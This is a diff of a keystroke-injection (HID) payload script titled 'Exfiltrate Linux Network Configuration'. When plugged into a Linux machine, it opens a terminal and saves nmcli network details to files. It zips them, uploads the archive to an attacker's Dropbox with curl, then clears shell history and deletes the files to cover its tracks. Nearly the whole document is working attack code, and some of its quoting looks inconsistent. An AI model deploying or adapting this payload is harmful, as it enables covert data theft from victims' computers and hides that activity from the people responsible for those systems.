@@ -1,85 +1,70 @@
-* ##########################################################
-* #                                                        |
-* # Title        : Exfiltrate Linux Network Configuration  |
-* # Author       : Aleff                                   |
-* # Version      : 1.0                                     |
-* # Category     : Exfiltration                            |
-* # Target       : Linux                                   |
-* #                                                        |
-* ##########################################################
+##########################################################
+#                                                        #
+# Title        : Exfiltrate Linux Network Configuration  #
+# Author       : Aleff                                   #
+# Version      : 1.0                                     #
+# Category     : Exfiltration                            #
+# Target       : Linux                                   #
+#                                                        #
+##########################################################
 
-* Requirements:
-*     - Internet Connection
-*     - Dropbox Account
-*     - - DROPBOX_ACCESS_TOKEN
+ATTACKMODE HID
 
-QUACK DELAY 1000
+# Requirements:
+#  - Internet Connection
+#  - DROPBOX ACCESS TOKEN
+
+# VARIABLES
+# - Set here your Dropbox access TOKEN
+DROPBOX_ACCESS_TOKEN='example'
+# - Set your own Dropbox folder name
+DROPBOX_FOLDER_NAME='example'
+
+QUACK DELAY 1500
 QUACK CTRL-ALT t
-
-QUACK DELAY 2000
-* Required: Set here your Dropbox access TOKEN
-QUACK STRING ACCESS_TOKEN="TOKEN"
-QUACK ENTER
-
-* QUACK DELAY 500
-* QUACK STRING USER_NAME=$(whoami)
-* QUACK ENTER
-
+# QUACK DELAY 500
+# QUACK STRING USER_NAME=$(whoami)
+# QUACK ENTER
 QUACK DELAY 500
 QUACK STRING RANDOM=$(shuf -i 1-999999999999 -n 1)
 QUACK ENTER
-
 QUACK DELAY 500
-QUACK STRING ZIP_NAME="$RANDOM.zip"
+QUACK STRING ZIP_NAME=\"$RANDOM.zip\"
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING ZIP_PATH="/home/$USER_NAME/Documents/$ZIP_NAME"
+QUACK STRING ZIP_PATH=\"/home/$USER_NAME/Documents/$ZIP_NAME\"
 QUACK ENTER
 
-* Folder path
+# Folder path
 QUACK DELAY 500
-QUACK STRING TMP_FOLDER_PATH=$(mktemp -d -p "/home/$USER_NAME/Documents" prefix-XXXXXXXXXX)
+QUACK STRING TMP_FOLDER_PATH=$(mktemp -d -p \"/home/$USER_NAME/Documents\" prefix-XXXXXXXXXX)
 QUACK ENTER
-
 QUACK DELAY 500
-QUACK STRING nmcli > "$TMP_FOLDER_PATH/nmcli.txt"
+QUACK STRING nmcli > \"$TMP_FOLDER_PATH/nmcli.txt\"
 QUACK ENTER
-
 QUACK DELAY 1000
-QUACK STRING nmcli connection show > "$TMP_FOLDER_PATH/nmcli_connection.txt"
+QUACK STRING nmcli connection show > \"$TMP_FOLDER_PATH/nmcli_connection.txt\"
 QUACK ENTER
-
 QUACK DELAY 1000
-QUACK STRING nmcli device show > "$TMP_FOLDER_PATH/nmcli_device.txt"
+QUACK STRING nmcli device show > \"$TMP_FOLDER_PATH/nmcli_device.txt\"
 QUACK ENTER
-
 QUACK DELAY 1000
-* Delay for zipping operation, it depends by computer power and folder directory
-QUACK STRING zip -r "$ZIP_PATH" "$TMP_FOLDER_PATH"
+
+# Delay for zipping operation, it depends by computer power and folder directory
+QUACK STRING zip -r \"$ZIP_PATH\" \"$TMP_FOLDER_PATH\"
 QUACK DELAY 3000
 
-
-* Set yout Dropbox folder name
-QUACK STRING DROPBOX_FOLDER="/DROPBOX_FOLDER_NAME"
+QUACK STRING curl -X POST 'https://content.dropboxapi.com/2/files/upload' --header 'Authorization: Bearer $DROPBOX_ACCESS_TOKEN' --header 'Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER_NAME\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}' --header 'Content-Type: application/octet-stream' --data-binary '@$ZIP_PATH'
 QUACK ENTER
-QUACK DELAY 500
-
-* DEFINE DROPBOX_API_CONST https://content.dropboxapi.com/2/files/upload
-QUACK STRING curl -X POST DROPBOX_API_CONST --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$ZIP_PATH"
-QUACK ENTER
-
 QUACK DELAY 2000
 QUACK STRING history -c
 QUACK ENTER
-
 QUACK DELAY 500
-QUACK STRING rm -rf "$TMP_FOLDER_PATH"
+QUACK STRING rm -rf \"$TMP_FOLDER_PATH\"
 QUACK ENTER
-
 QUACK DELAY 500
-QUACK STRING rm -rf "$ZIP_PATH"
+QUACK STRING rm -rf \"$ZIP_PATH\"
 QUACK ENTER
-
 QUACK DELAY 500
 QUACK STRING exit
 QUACK ENTER
